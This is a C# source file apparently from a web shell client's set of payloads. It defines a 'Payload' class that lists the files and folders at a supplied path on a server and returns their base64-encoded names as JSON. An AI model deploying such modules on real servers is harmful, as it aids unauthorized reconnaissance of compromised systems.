using System;
using System.Web;
using System.IO;
using System.Text;
using System.Runtime.Serialization;
using System.Security.AccessControl;
using System.Collections;

public class Payload
{

    [DataContract]
    class Ret
    {

        [DataMember]
        public int code = 0;

        [DataMember]
        public ArrayList list = new ArrayList();
    }
    Ret ret;
    public string Run()
    {
        ret = new Ret();
        Directory.SetCurrentDirectory(Global.pwd);
        if(Directory.Exists(Global.path)){
            DirectoryInfo directory = new DirectoryInfo(Global.path);
            foreach(FileInfo f in directory.GetFiles()){
                ret.list.Add(Convert.ToBase64String(Encoding.UTF8.GetBytes(f.Name)));
            }
            foreach(DirectoryInfo d in directory.GetDirectories()){
                ret.list.Add(Convert.ToBase64String(Encoding.UTF8.GetBytes(d.Name)));
            }
            ret.code = 1;
        }
        return Global.json_encode(ret);
    }
}